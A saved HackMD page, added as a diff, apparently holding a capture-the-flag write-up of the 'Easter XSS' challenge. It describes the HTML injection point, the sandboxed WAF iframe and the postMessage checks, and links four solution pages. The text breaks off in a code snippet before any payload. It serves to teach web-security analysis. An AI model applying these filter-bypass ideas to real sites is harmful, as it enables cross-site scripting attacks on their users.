@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>
+        Easter XSS by @terjanq - HackMD
+    </title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
+    <style>
+        @charset "UTF-8";@import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i|Source+Code+Pro:300,400,500|Source+Sans+Pro:300,300i,400,400i,600,600i|Source+Serif+Pro&subset=latin-ext);.hljs{display:block;background:#fff;padding:.5em;color:#333;overflow-x:auto}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-string,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#a71d5d}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#0086b3}.hljs-built_in,.hljs-builtin-name{color:#005cc5}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#795da3}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.markdown-body{font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{font-size:16px;padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body kbd,.popover kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{padding-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important;position:relative}.markdown-body .emoji{vertical-align:top}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{text-align:center;background-color:inherit;border-radius:0;white-space:inherit;overflow:visible}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body .mark,.markdown-body mark{background-color:#fff1a7}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.MJX_Assistive_MathML{display:none}#MathJax_Message{z-index:1000!important}.ui-infobar{position:relative;z-index:2;max-width:760px;margin:25px auto -25px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:998}.ui-toc.both-mode{margin-left:8px}.ui-toc.both-mode .ui-toc-label{height:40px;padding:10px 4px;border-top-left-radius:0;border-bottom-left-radius:0}.ui-toc-label{background-color:#e6e6e6;border:none;color:#868686;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:20px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child > ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif}html[lang^=ja] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html .markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html .markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html .markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html[lang^=ja] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html[lang=zh-tw] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html[lang=zh-cn] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}html .ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html .ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html .ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:50%;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:cover}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.ui-more-info{color:#888;cursor:pointer;vertical-align:middle}.ui-more-info .fa{font-size:16px}.ui-connectedGithub,.ui-published-note{color:#888}.ui-connectedGithub{line-height:23px;white-space:nowrap}.ui-connectedGithub a.file-path{color:#888;text-decoration:none;padding-left:22px}.ui-connectedGithub a.file-path:active,.ui-connectedGithub a.file-path:hover{color:#888;text-decoration:underline}.ui-connectedGithub .fa{font-size:20px}.ui-published-note .fa{font-size:20px;vertical-align:top}.unselectable{-webkit-user-select:none;-o-user-select:none;user-select:none}.selectable{-webkit-user-select:text;-o-user-select:text;user-select:text}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}.site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;letter-spacing:.025em;font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] body{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}abbr[data-original-title],abbr[title]{cursor:help}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid comment-inner comment-enabled" data-hard-breaks="true" style=""><h1 id="Easter-XSS-by-terjanq" data-id="Easter-XSS-by-terjanq" style=""><a class="anchor hidden-xs" href="#Easter-XSS-by-terjanq" title="Easter-XSS-by-terjanq"><span class="octicon octicon-link"></span></a><span>Easter XSS by </span><a href="https://twitter.com/terjanq" target="_blank" rel="noopener"><span>@terjanq</span></a></h1><h2 id="A-quick-look" data-id="A-quick-look" style=""><a class="anchor hidden-xs" href="#A-quick-look" title="A-quick-look"><span class="octicon octicon-link"></span></a><span>A quick look</span></h2><ul>
+<li><span>Source code consists of two files:</span>
+<ul>
+<li><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/index.html" target="_blank" rel="noopener"><span>index.html</span></a></li>
+<li><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/waf.html" target="_blank" rel="noopener"><span>waf.html</span></a></li>
+</ul>
+</li>
+<li><span>Users can inject html code via: </span><a href="https://challenge-0421.intigriti.io/?error=%3Ch1%3EHello!%3C/h1%3E" target="_blank" rel="noopener"><span>?error=&lt;h1&gt;Hello!&lt;/h1&gt;</span></a></li>
+<li><span>Input is processed via sandboxed subframe </span><a href="https://challenge-0421.intigriti.io/waf.html" target="_blank" rel="noopener"><span>waf.html</span></a></li>
+<li><span>Error message disappears after 10 seconds</span></li>
+<li><span>The site is not framable due to the </span><code>X-Frame-Options: DENY</code><span> header</span></li>
+<li><span>The goal of the challenge is to trigger an interaction-less XSS on </span><code>challenge-0421.intigriti.io</code></li>
+</ul><h2 id="TLDR-solutions" data-id="TLDR-solutions" style=""><a class="anchor hidden-xs" href="#TLDR-solutions" title="TLDR-solutions"><span class="octicon octicon-link"></span></a><span>TL;DR solutions</span></h2><ul>
+<li><span>Naive solution with 2 iframes: </span><a href="https://easterxss.terjanq.me/naive-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/naive-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/naive-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>), jump to </span><a href="#Naive-solution"><em><span>Naive solution</span></em></a></li>
+<li><span>37 iframes and </span><code>iframe.location++</code><span>: </span><a href="https://easterxss.terjanq.me/l-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/l-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/l-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>), jump to </span><a href="#More-iframes"><em><span>More iframes</span></em></a></li>
+<li><span>37 iframes and </span><code>iframe.name++</code><span>: </span><a href="https://easterxss.terjanq.me/n-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/n-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/n-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>), jump to </span><a href="#Let%E2%80%99s-go-faster"><em><span>Let’s go faster</span></em></a></li>
+<li><span>no iframes and </span><code>top.name++</code><span>: </span><a href="https://easterxss.terjanq.me/t-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/t-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/t-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>), jump to </span><a href="#Dark-Arts-solution"><em><span>Dark Arts solution</span></em></a></li>
+</ul><p><em><span>Share your time scores on Twitter!</span></em></p><h2 id="How-does-HTML-injection-work" data-id="How-does-HTML-injection-work" style=""><a class="anchor hidden-xs" href="#How-does-HTML-injection-work" title="How-does-HTML-injection-work"><span class="octicon octicon-link"></span></a><span>How does HTML injection work</span></h2><p><span>A top window sends untrusted data through </span><code>postMessage</code><span> communication with a sandboxed </span><code>waf.html</code><span> iframe.</span></p><pre><code class="javascript hljs">  <span class="token keyword">function</span> <span class="token function">addError</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+      wafIframe<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+          identifier<span class="token punctuation">,</span>
+          str
+      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+</code></pre><p><span>It uses a random </span><code>identifier</code><span> for proof that the communication is not “intercepted”. In response, the WAF sends an object with </span><code>safe</code><span> attribute determining whether the input is safe or not.</span></p><pre><code class="javascript hljs"><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> identifier <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>identifier<span class="token punctuation">;</span>
+    e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+        type<span class="token operator">:</span><span class="token string">'waf'</span><span class="token punctuation">,</span>
+        identifier<span class="token punctuation">,</span>
+        str<span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">,</span>
+        safe<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WAF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isSafe</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">)</span>
